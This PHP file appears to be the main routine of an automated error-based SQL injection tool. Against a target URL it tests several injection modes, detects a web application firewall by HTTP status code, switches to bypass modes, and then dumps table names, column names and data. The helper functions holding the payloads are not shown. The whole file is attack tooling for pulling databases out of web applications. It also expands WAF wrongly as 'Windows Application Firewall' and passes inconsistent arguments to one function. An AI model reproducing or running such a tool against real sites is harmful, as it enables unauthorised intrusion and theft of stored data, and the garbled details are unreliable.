<?php
$pattern = "Duplicate entry ";
$array_table = array();
$array_column = array();

showHeader();

$start = microtime(true);

echo "\r\n[*]Checking if the target is vulnerable to SQLi Error Based\r\n";

$vuln = isVulnerable($url);

if ($vuln == 1)
{
	echo "[+]You're lucky, the target seems to be vulnerable to SQLi error based\r\n";

	$end = microtime(true);
	$t = round($end - $start,2);

	echo "[*]The tests took about $t seconds\r\n";
	echo "[+]Retrieving tables name...\r\n\r\n";

	getTables($url,'regular');

	$table = getTargetTable();
	$hex = strToHex($table);

	echo "[+]Retrieving columns name from table `{$table}`...\r\n\r\n";

	getColumns($table,'regular');

	list($query, $raws0) = getTargetColumns();

	echo "[+]Retrieving `{$raws0}` from table `{$table}`\r\n\r\n";

	getData('regular');

	echo "[+]Successful Exploitation...Bye\r\n";
}
elseif($vuln == 0)
{
	echo "[-]Target not vulnerable to SQLi Error Based\r\n";
	echo "[*]Switching mode to SQLi error based type string\r\n";

	list($isVuln,$request) = isVulnerableString($url);

	if($isVuln == 1)
	{
		echo "[+]You're lucky the target seems to be vulnerable to SQLi error based type string\r\n";

		$end = microtime(true);
		$t = round($end - $start,2);

		echo "[*]The tests took about $t seconds\r\n";
		echo "[+]Retrieving tables name...\r\n\r\n";

		getTables($url,'string');

		$table = getTargetTable();
		$hex = strToHex($table);

		echo "[+]Retrieving columns name from table `{$table}`...\r\n\r\n";

		getColumns($url,'string');

		list($query, $raws0) = getTargetColumns();

		echo "[+]Retrieving `{$raws0}` from table `{$table}`\r\n\r\n";

		getData('string');

		echo "[+]Successful Exploitation...Bye\r\n";	
	}
	else
	{
		echo "[-]Target not vulnerable to SQLi Error Based type string\r\n";
		echo "[*]Checking if a WAF (Windows Application Firewall) is present\r\n";

		$code = getHttpCode($request);

		if($code == '403' OR $code == '406' OR $code == '500' OR $code == '400' )
		{
			echo "[+]Return code is $code => WAF detected\r\n";
			echo "[+]Switching mode to SQLi Error Based WAF bypass\r\n";

			$isVuln = isVulnerableWaf($url);

			if($isVuln == 1)
			{
				echo "[+]You're lucky the target seems to be vulnerable to SQLi error based, MODE = WAF bypass\r\n";

				$end = microtime(true);
				$t = round($end - $start,2);

				echo "[*]The tests took about $t seconds\r\n";
				echo "[+]Retrieving tables name...\r\n\r\n";

				getTables($url,'regularWAF');

				$table = getTargetTable();
				$hex = strToHex($table);

				echo "[+]Retrieving columns name from table `{$table}`...\r\n\r\n";

				getColumns($table, 'regularWAF');

				list($query, $raws0) = getTargetColumns();

				echo "[+]Retrieving `{$raws0}` from table `{$table}`\r\n\r\n";

				getData('regularWAF');

				echo "[+]Successful Exploitation...Bye\r\n";	
				
			}
			elseif($isVuln != 1)
			{
				echo "[-]Target not vulnerable to SQLi Error Based, MODE = WAF bypass\r\n";
				echo "[+]Switching mode to SQLi Error Based type string, MODE = WAF bypass\r\n";

				$vuln= isVulnerableStringWaf($url);

				if($vuln == 1)
				{
					echo "[+]You're lucky the target seems to be vulnerable to SQLi error based type string, MODE = WAF bypass\r\n";

					$end = microtime(true);
					$t = round($end - $start,2);

					echo "[*]The tests took about $t seconds\r\n";
					echo "[+]Retrieving tables name...\r\n\r\n";

					getTables($url,'stringWAF');

					$table = getTargetTable();
					$hex = strToHex($table);

					echo "[+]Retrieving columns name from table `{$table}`...\r\n\r\n";

					getColumns($table, 'stringWAF');

					list($query, $raws0) = getTargetColumns();

					echo "[+]Retrieving `{$raws0}` from table `{$table}`\r\n\r\n";

					getData('stringWAF');

					echo "[+]Successful Exploitation...Bye\r\n";
				}
				else
				{
					echo "[-]Target not vulnerable to SQLi Error Based type string, MODE = WAF bypass\r\n";

					$end = microtime(true);
					$t = round($end - $start,2);

					echo "[*]The tests took about $t seconds\r\n";

					die();
				}
			}
			else
			{
				echo "[-]The script is not able to bypass the WAF, try manually..\r\n";

				$end = microtime(true);
				$t = round($end - $start,2);

				echo "[*]The tests took about $t seconds\r\n";

				die();
			}
			
		}
		else
		{
			echo "[-]Target not vulnerable to SQLi Error Based\r\n";

			$end = microtime(true);
			$t = round($end - $start,2);

			echo "[*]The tests took about $t seconds\r\n";

			die();
		}
		
	}
}
?>
